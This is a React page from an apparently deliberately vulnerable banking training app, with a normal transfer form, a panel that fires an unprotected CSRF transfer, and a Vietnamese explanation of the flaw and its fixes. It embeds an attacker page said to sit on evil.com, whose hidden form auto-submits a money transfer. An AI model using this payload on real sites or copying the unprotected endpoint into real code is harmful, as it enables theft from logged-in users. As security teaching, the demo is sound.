import React, { useState } from 'react'
import axios from 'axios'

const Transfer = () => {
  const [fromAccount, setFromAccount] = useState('')
  const [toAccount, setToAccount] = useState('')
  const [amount, setAmount] = useState('')
  const [result, setResult] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  // CSRF demo state
  const [csrfFrom, setCsrfFrom] = useState('ACC-001')
  const [csrfTo, setCsrfTo] = useState('ACC-002')
  const [csrfAmount, setCsrfAmount] = useState('500000')
  const [csrfResult, setCsrfResult] = useState(null)
  const [csrfLoading, setCsrfLoading] = useState(false)
  const [showExplain, setShowExplain] = useState(false)

  // Chuyển tiền bình thường
  const handleTransfer = async () => {
    if (!fromAccount || !toAccount || !amount) {
      setError('Vui lòng điền đầy đủ thông tin')
      return
    }
    setLoading(true)
    setError('')
    setResult(null)
    try {
      const formData = new FormData()
      formData.append('from_account', fromAccount)
      formData.append('to_account', toAccount)
      formData.append('amount', amount)
      const res = await axios.post('/api/auth/transfer', formData)
      setResult({ success: true, data: res.data })
    } catch (err) {
      setResult({ success: false, message: err.response?.data?.error || 'Lỗi kết nối server' })
    } finally {
      setLoading(false)
    }
  }

  // CSRF attack demo: gửi thẳng không có CSRF token
  const handleCsrfAttack = async () => {
    setCsrfLoading(true)
    setCsrfResult(null)
    try {
      const formData = new FormData()
      formData.append('from_account', csrfFrom)
      formData.append('to_account', csrfTo)
      formData.append('amount', csrfAmount)

      // Không gửi kèm bất kỳ CSRF token hoặc Origin check nào
      // Server vẫn xử lý bình thường → đây là lỗ hổng CSRF
      const res = await axios.post('/api/auth/transfer', formData, {
        headers: {
          // Không có X-CSRF-Token
          // Không có custom Origin header
        }
      })
      setCsrfResult({ success: true, data: res.data })
    } catch (err) {
      setCsrfResult({ success: false, message: err.response?.data?.error || 'Lỗi kết nối' })
    } finally {
      setCsrfLoading(false)
    }
  }

  // Tạo HTML độc hại giả lập trang attacker
  const maliciousHtml = `<!-- Trang web attacker (evil.com) -->
<html>
<body onload="document.getElementById('csrfForm').submit()">
  <form id="csrfForm"
        action="http://localhost/api/auth/transfer"
        method="POST"
        style="display:none">
    <input name="from_account" value="${csrfFrom}" />
    <input name="to_account"   value="${csrfTo}" />
    <input name="amount"       value="${csrfAmount}" />
  </form>
  <p>Bạn đã trúng thưởng! Đang xử lý...</p>
</body>
</html>`

  return (
    <div className="min-h-screen bg-gray-50 p-6">
      <div className="max-w-5xl mx-auto">

        {/* Header */}
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-800">💸 Chuyển Khoản Nội Bộ</h1>
          <p className="text-gray-500 mt-1">NexTrade Corp — Hệ thống thanh toán nội bộ</p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">

          {/* === PANEL 1: FORM CHUYỂN TIỀN BÌNH THƯỜNG === */}
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
            <div className="flex items-center gap-2 mb-5">
              <div className="w-8 h-8 bg-blue-100 rounded-lg flex items-center justify-center">
                <span className="text-blue-600 text-sm">✅</span>
              </div>
              <h2 className="text-lg font-semibold text-gray-800">Chuyển tiền thông thường</h2>
            </div>
            <p className="text-sm text-gray-500 mb-5">
              Form chuyển tiền từ tài khoản nguồn sang tài khoản đích. Gọi trực tiếp
              <code className="bg-gray-100 px-1 rounded text-xs ml-1">POST /api/auth/transfer</code>
            </p>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Tài khoản nguồn
                </label>
                <input
                  type="text"
                  value={fromAccount}
                  onChange={e => setFromAccount(e.target.value)}
                  placeholder="VD: ACC-001"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Tài khoản đích
                </label>
                <input
                  type="text"
                  value={toAccount}
                  onChange={e => setToAccount(e.target.value)}
                  placeholder="VD: ACC-002"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Số tiền (VNĐ)
                </label>
                <input
                  type="number"
                  value={amount}
                  onChange={e => setAmount(e.target.value)}
                  placeholder="VD: 500000"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>

              {error && (
                <div className="bg-red-50 border border-red-200 text-red-600 text-sm rounded-lg p-3">
                  {error}
                </div>
              )}

              <button
                onClick={handleTransfer}
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-medium py-2.5 rounded-lg transition-colors text-sm"
              >
                {loading ? 'Đang xử lý...' : 'Chuyển tiền'}
              </button>
            </div>

            {result && (
              <div className={`mt-4 rounded-lg p-3 text-sm ${result.success ? 'bg-green-50 border border-green-200 text-green-700' : 'bg-red-50 border border-red-200 text-red-600'}`}>
                <p className="font-medium mb-1">{result.success ? '✅ Thành công' : '❌ Thất bại'}</p>
                <pre className="text-xs whitespace-pre-wrap break-all">
                  {JSON.stringify(result.success ? result.data : { error: result.message }, null, 2)}
                </pre>
              </div>
            )}
          </div>

          {/* === PANEL 2: CSRF ATTACK DEMO === */}
          <div className="bg-white rounded-xl shadow-sm border border-red-200 p-6">
            <div className="flex items-center gap-2 mb-2">
              <div className="w-8 h-8 bg-red-100 rounded-lg flex items-center justify-center">
                <span className="text-red-600 text-sm">⚠️</span>
              </div>
              <h2 className="text-lg font-semibold text-red-700">Demo CSRF Attack</h2>
              <span className="ml-auto text-xs bg-red-100 text-red-600 px-2 py-0.5 rounded-full font-medium">
                VULNERABLE
              </span>
            </div>
            <p className="text-sm text-gray-500 mb-5">
              Giả lập attacker gửi request chuyển tiền <strong>không có CSRF token</strong> và{' '}
              <strong>không verify Origin</strong>. Server vẫn chấp nhận.
            </p>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  from_account <span className="text-red-400 text-xs">(attacker kiểm soát)</span>
                </label>
                <input
                  type="text"
                  value={csrfFrom}
                  onChange={e => setCsrfFrom(e.target.value)}
                  className="w-full border border-red-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-400 bg-red-50"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  to_account <span className="text-red-400 text-xs">(tài khoản attacker)</span>
                </label>
                <input
                  type="text"
                  value={csrfTo}
                  onChange={e => setCsrfTo(e.target.value)}
                  className="w-full border border-red-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-400 bg-red-50"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  amount
                </label>
                <input
                  type="number"
                  value={csrfAmount}
                  onChange={e => setCsrfAmount(e.target.value)}
                  className="w-full border border-red-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-red-400 bg-red-50"
                />
              </div>

              <button
                onClick={handleCsrfAttack}
                disabled={csrfLoading}
                className="w-full bg-red-600 hover:bg-red-700 disabled:opacity-50 text-white font-medium py-2.5 rounded-lg transition-colors text-sm"
              >
                {csrfLoading ? 'Đang tấn công...' : '🚨 Kích hoạt CSRF Attack'}
              </button>
            </div>

            {csrfResult && (
              <div className={`mt-4 rounded-lg p-3 text-sm ${csrfResult.success ? 'bg-orange-50 border border-orange-300 text-orange-700' : 'bg-red-50 border border-red-200 text-red-600'}`}>
                <p className="font-medium mb-1">
                  {csrfResult.success ? '🔓 Server chấp nhận request không có CSRF token!' : '❌ Request thất bại'}
                </p>
                <pre className="text-xs whitespace-pre-wrap break-all">
                  {JSON.stringify(csrfResult.success ? csrfResult.data : { error: csrfResult.message }, null, 2)}
                </pre>
              </div>
            )}
          </div>
        </div>

        {/* === PHẦN GIẢI THÍCH LỖ HỔNG === */}
        <div className="mt-6 bg-white rounded-xl shadow-sm border border-gray-200 p-6">
          <button
            onClick={() => setShowExplain(!showExplain)}
            className="flex items-center gap-2 w-full text-left"
          >
            <span className="text-lg">📚</span>
            <h3 className="font-semibold text-gray-700">Phân tích lỗ hổng CSRF</h3>
            <span className="ml-auto text-gray-400 text-sm">{showExplain ? '▲ Thu gọn' : '▼ Mở rộng'}</span>
          </button>

          {showExplain && (
            <div className="mt-4 space-y-4">

              {/* Lý do lỗ hổng */}
              <div className="bg-red-50 border-l-4 border-red-400 p-4 rounded-r-lg">
                <p className="font-medium text-red-700 text-sm mb-2">❌ Tại sao bị lỗ hổng?</p>
                <ul className="text-sm text-red-600 space-y-1 list-disc list-inside">
                  <li>Endpoint <code className="bg-red-100 px-1 rounded">/api/auth/transfer</code> không yêu cầu CSRF token</li>
                  <li>Backend không kiểm tra <code className="bg-red-100 px-1 rounded">Origin</code> hay <code className="bg-red-100 px-1 rounded">Referer</code> header</li>
                  <li>CORS được cấu hình <code className="bg-red-100 px-1 rounded">allow_origins=["*"]</code> trong <code className="bg-red-100 px-1 rounded">main.py</code></li>
                  <li>Request dùng <code className="bg-red-100 px-1 rounded">multipart/form-data</code> — trình duyệt tự gửi được từ bất kỳ domain nào</li>
                </ul>
              </div>

              {/* HTML tấn công */}
              <div>
                <p className="font-medium text-gray-700 text-sm mb-2">
                  🎭 HTML trang attacker giả lập (evil.com):
                </p>
                <pre className="bg-gray-900 text-green-400 text-xs rounded-lg p-4 overflow-x-auto leading-relaxed">
                  {maliciousHtml}
                </pre>
                <p className="text-xs text-gray-500 mt-2">
                  Khi victim đang đăng nhập NexTrade và truy cập trang này, form tự submit ngay lập tức.
                </p>
              </div>

              {/* Cách fix */}
              <div className="bg-green-50 border-l-4 border-green-400 p-4 rounded-r-lg">
                <p className="font-medium text-green-700 text-sm mb-2">✅ Cách khắc phục:</p>
                <ul className="text-sm text-green-700 space-y-1 list-disc list-inside">
                  <li>Thêm CSRF token vào mỗi request (Double Submit Cookie hoặc Synchronizer Token)</li>
                  <li>Kiểm tra <code className="bg-green-100 px-1 rounded">Origin</code> header — chỉ cho phép domain nội bộ</li>
                  <li>Dùng <code className="bg-green-100 px-1 rounded">SameSite=Strict</code> cho cookie session</li>
                  <li>Chuyển sang <code className="bg-green-100 px-1 rounded">application/json</code> thay vì form-data</li>
                </ul>
              </div>

            </div>
          )}
        </div>

      </div>
    </div>
  )
}

export default Transfer
